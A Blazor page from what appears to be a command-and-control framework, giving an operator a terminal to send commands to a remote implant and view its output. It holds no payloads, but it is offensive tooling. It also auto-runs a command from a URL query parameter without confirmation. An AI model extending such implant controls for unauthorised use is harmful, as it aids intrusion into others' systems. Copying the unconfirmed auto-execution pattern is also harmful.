@page "/terminal/{AgentId}"
@using WebCommander.Models
@using WebCommander.Services
@using WebCommander.Helpers
@using WebCommander.Components
@inject AgentService AgentService
@inject NavigationManager NavigationManager
@inject CommandService CommandService
@inject IJSRuntime JSRuntime
@inject TerminalHistoryService TerminalHistoryService

<PageTitle>Terminal - @(agent?.Metadata?.ImplantId ?? "Unknown")</PageTitle>

<div class="terminal-page-container">
    @if (agent == null)
    {
        <p>Agent not found</p>
    }
    else
    {
        <div class="container-fluid">
            <AgentHeader Agent="@agent" 
                         AllAgents="@AgentService.GetAgents()"
                         ShowInteractButton="false"
                         ShowBackButton="true"
                         BackButtonText="Close"
                         OnBack="Close" />
        </div>
        
        <div class="terminal-container">
            <div class="terminal-output" @ref="terminalOutput">
                @foreach (var line in outputLines)
                {
                    <div class="terminal-line @GetLineClass(line.Type)">@line.Text</div>
                }
            </div>
            
            <div class="terminal-input-container">
                <span class="terminal-prompt">@(agent.Metadata?.ImplantId ?? "Unknown") &gt;</span>
                <input type="text" 
                       class="terminal-input" 
                       @bind="currentCommand" 
                       @bind:event="oninput"
                       @onkeydown="HandleKeyDown"
                       @ref="inputElement"
                       placeholder="Type a command..." />
            </div>
        </div>
    }
</div>

<style>
    .terminal-page-container {
        height: calc(100vh - 60px);
        display: flex;
        flex-direction: column;
        overflow: hidden;
    }

    .terminal-container {
        flex: 1;
        display: flex;
        flex-direction: column;
        background-color: #1e1e1e;
        color: #d4d4d4;
        font-family: 'Consolas', 'Courier New', monospace;
        margin: 0 1rem 1rem 1rem;
        border-radius: 4px;
        overflow: hidden;
        min-height: 0;
        max-height: calc(100vh - 275px);
    }

    .terminal-output {
        flex: 1;
        overflow-y: auto;
        padding: 20px;
        font-size: 14px;
        line-height: 1.5;
        min-height: 0;
    }

    .terminal-line {
        margin-bottom: 5px;
        white-space: pre-wrap;
        word-wrap: break-word;
    }

    .terminal-line.error {
        color: #f48771;
    }

    .terminal-line.warning {
        color: #dcdcaa;
    }

    .terminal-line.info {
        color: #4ec9b0;
    }

    .terminal-line.normal {
        color: #d4d4d4;
    }

    .terminal-input-container {
        background-color: #2d2d30;
        padding: 10px 20px;
        border-top: 1px solid #3e3e42;
        display: flex;
        align-items: center;
    }

    .terminal-prompt {
        color: #4ec9b0;
        margin-right: 10px;
        font-weight: bold;
    }

    .terminal-input {
        flex: 1;
        background-color: transparent;
        border: none;
        color: #d4d4d4;
        font-family: 'Consolas', 'Courier New', monospace;
        font-size: 14px;
        outline: none;
    }

    .terminal-input::placeholder {
        color: #6a6a6a;
    }

    .terminal-output::-webkit-scrollbar {
        width: 10px;
    }

    .terminal-output::-webkit-scrollbar-track {
        background: #1e1e1e;
    }

    .terminal-output::-webkit-scrollbar-thumb {
        background: #3e3e42;
        border-radius: 5px;
    }

    .terminal-output::-webkit-scrollbar-thumb:hover {
        background: #555;
    }
</style>

@code {
    [Parameter]
    public string AgentId { get; set; } = string.Empty;

    [Parameter]
    [SupplyParameterFromQuery(Name = "command")]
    public string? Command { get; set; }

    private Agent? agent;
    private string currentCommand = string.Empty;
    private List<TerminalLine> outputLines = new();
    private HashSet<string> sentTaskIds = new();
    private Dictionary<string, string> taskCommands = new();
    private ElementReference terminalOutput;
    private ElementReference inputElement;
    
    // Command history
    private List<string> commandHistory = new();
    private int historyIndex = -1;
    private bool shouldExecuteCommand = false;

    protected override async Task OnInitializedAsync()
    {
        agent = AgentService.GetAgents().FirstOrDefault(a => a.Id == AgentId);
        
        if (agent != null)
        {
            var history = await TerminalHistoryService.LoadHistoryAsync(AgentId);
            if (history != null && history.OutputLines.Any())
            {
                outputLines = history.OutputLines;
                commandHistory = history.CommandHistory;
                sentTaskIds = history.SentTaskIds;
                taskCommands = history.TaskCommands;
                // Scroll to bottom after loading
                shouldScrollToBottom = true;
            }
            else
            {
                AddInfo($"Connected to agent {agent.Metadata?.ImplantId ?? "Unknown"}");
                AddInfo($"User: {agent.Metadata?.Desc}");
                AddInfo($"Architecture: {agent.Metadata?.Architecture}");
                AddInfo($"Process: {agent.Metadata?.ProcessName} (PID: {agent.Metadata?.ProcessId})");
                AddNormal("");
            }
        }

        AgentService.OnAgentsUpdated += RefreshAgent;
        AgentService.OnAgentResult += HandleAgentResult;

        // Auto-execute command if provided via query parameter
        if (!string.IsNullOrWhiteSpace(Command))
        {
            shouldExecuteCommand = true;
        }
    }

    private void RefreshAgent()
    {
        var updatedAgent = AgentService.GetAgents().FirstOrDefault(a => a.Id == AgentId);
        if (updatedAgent != null)
        {
            agent = updatedAgent;
            InvokeAsync(StateHasChanged);
        }
    }

    public void Dispose()
    {
        AgentService.OnAgentsUpdated -= RefreshAgent;
        AgentService.OnAgentResult -= HandleAgentResult;
    }

    private void AddNormal(string text)
    {
        outputLines.Add(new TerminalLine { Text = text, Type = TerminalLineType.Normal });
        _ = SaveHistory();
        _ = ScrollToBottom();
    }

    private void AddError(string text)
    {
        outputLines.Add(new TerminalLine { Text = text, Type = TerminalLineType.Error });
        _ = SaveHistory();
        _ = ScrollToBottom();
    }

    private void AddWarning(string text)
    {
        outputLines.Add(new TerminalLine { Text = text, Type = TerminalLineType.Warning });
        _ = SaveHistory();
        _ = ScrollToBottom();
    }

    private void AddInfo(string text)
    {
        outputLines.Add(new TerminalLine { Text = text, Type = TerminalLineType.Info });
        _ = SaveHistory();
        _ = ScrollToBottom();
    }

    private string GetLineClass(TerminalLineType type)
    {
        return type switch
        {
            TerminalLineType.Error => "error",
            TerminalLineType.Warning => "warning",
            TerminalLineType.Info => "info",
            _ => "normal"
        };
    }

    private void HandleAgentResult(AgentTaskResult result)
    {
        Console.WriteLine($"[Terminal] Received result for task {result.Id}, Status: {result.Status}");
        
        // Only display results for tasks sent by this terminal
        if (!sentTaskIds.Contains(result.Id))
        {
            Console.WriteLine($"[Terminal] Task {result.Id} not sent by this terminal, ignoring");
            return;
        }

        Console.WriteLine($"[Terminal] Processing result for task {result.Id}");
        
        if (result.Status == AgentResultStatus.Completed || result.Status == AgentResultStatus.Error)
        {
            // Get command name if available
            var commandName = taskCommands.TryGetValue(result.Id, out var cmd) ? cmd : "unknown";
            
            Console.WriteLine($"[Terminal] Command: {commandName}, Status: {result.Status}, Error: {result.Error}, Output length: {result.Output?.Length ?? 0}");
            
            // Display header with appropriate color
            if (result.Status == AgentResultStatus.Error)
            {
                AddError($"Task {commandName} failed with status: {result.Status}");
                AddError("-------------------------------------------");
            }
            else
            {
                AddInfo($"Task {commandName} is {result.Status}");
                AddInfo("-------------------------------------------");
            }
            
            if (!string.IsNullOrEmpty(result.Output))
            {
                AddNormal(result.Output);
            }
            if (!string.IsNullOrEmpty(result.Error))
            {
                AddError(result.Error);
            }
            AddNormal("");
            StateHasChanged();
            _ = ScrollToBottom();
        }
        else
        {
            Console.WriteLine($"[Terminal] Unhandled status: {result.Status}");
        }
    }

    private bool shouldScrollToBottom = false;

    protected override async Task OnAfterRenderAsync(bool firstRender)
    {
        if (firstRender)
        {
            await inputElement.FocusAsync();

            // Execute command from query parameter if provided
            if (shouldExecuteCommand && !string.IsNullOrWhiteSpace(Command))
            {
                shouldExecuteCommand = false;
                await ExecuteCommand(Command);
            }
        }

        if (shouldScrollToBottom)
        {
            shouldScrollToBottom = false;
            await ScrollToBottom();
        }
    }

    private async Task HandleKeyDown(KeyboardEventArgs e)
    {
        // Handle history navigation
        if (e.Key == "ArrowUp")
        {
            if (commandHistory.Count > 0 && historyIndex < commandHistory.Count - 1)
            {
                historyIndex++;
                currentCommand = commandHistory[historyIndex];
                StateHasChanged();
            }
            return;
        }
        else if (e.Key == "ArrowDown")
        {
            if (historyIndex > 0)
            {
                historyIndex--;
                currentCommand = commandHistory[historyIndex];
                StateHasChanged();
            }
            else if (historyIndex == 0)
            {
                historyIndex = -1;
                currentCommand = string.Empty;
                StateHasChanged();
            }
            return;
        }
        
        if (e.Key == "Enter" && !string.IsNullOrWhiteSpace(currentCommand))
        {
            // Store the command for later reference
            var commandToSend = currentCommand;
            
            // Add to history (at the beginning of the list)
            commandHistory.Insert(0, commandToSend);
            historyIndex = -1; // Reset history navigation
            
            // Add command to output
            AddNormal($"{agent?.Metadata?.ImplantId ?? "Unknown"} > {commandToSend}");
            
            // Send command
            var (message, error, taskId) = await CommandService.ParseAndSendAsync(commandToSend, AgentId);
            if(!string.IsNullOrEmpty(error))
                AddError(error);
            if(!string.IsNullOrEmpty(message))
                AddNormal(message);
            
            // Track task ID if command was sent successfully
            if (taskId != null)
            {
                sentTaskIds.Add(taskId);
                // Store command name (first word)
                var cmdName = commandToSend.Split(' ')[0];
                taskCommands[taskId] = cmdName;
            }
            
            // Clear input
            currentCommand = string.Empty;
            
            StateHasChanged();
            
            // Scroll to bottom
            await ScrollToBottom();
            await SaveHistory();
        }
    }

    private async Task SaveHistory()
    {
        if (agent == null) return;

        var history = new TerminalHistory
        {
            OutputLines = outputLines,
            CommandHistory = commandHistory,
            SentTaskIds = sentTaskIds,
            TaskCommands = taskCommands
        };

        await TerminalHistoryService.SaveHistoryAsync(AgentId, history);
    }

    private async Task ScrollToBottom()
    {
        try
        {
            await Task.Delay(10);
            await JSRuntime.InvokeVoidAsync("eval", 
                "document.querySelector('.terminal-output').scrollTop = document.querySelector('.terminal-output').scrollHeight");
        }
        catch
        {
            // Ignore errors if element not found
        }
    }

    private async Task ExecuteCommand(string commandToSend)
    {
        if (string.IsNullOrWhiteSpace(commandToSend) || agent == null)
            return;

        // Add to history (at the beginning of the list)
        commandHistory.Insert(0, commandToSend);
        historyIndex = -1; // Reset history navigation

        // Add command to output
        AddNormal($"{agent.Metadata?.ImplantId ?? "Unknown"} > {commandToSend}");

        // Send command
        var (message, error, taskId) = await CommandService.ParseAndSendAsync(commandToSend, AgentId);
        if (!string.IsNullOrEmpty(error))
            AddError(error);
        if (!string.IsNullOrEmpty(message))
            AddNormal(message);

        // Track task ID if command was sent successfully
        if (taskId != null)
        {
            sentTaskIds.Add(taskId);
            // Store command name (first word)
            var cmdName = commandToSend.Split(' ')[0];
            taskCommands[taskId] = cmdName;
        }

        // Clear input
        currentCommand = string.Empty;

        StateHasChanged();

        // Scroll to bottom
        await ScrollToBottom();
        await SaveHistory();
    }

    private void Close()
    {
        NavigationManager.NavigateTo("/agents");
    }
}
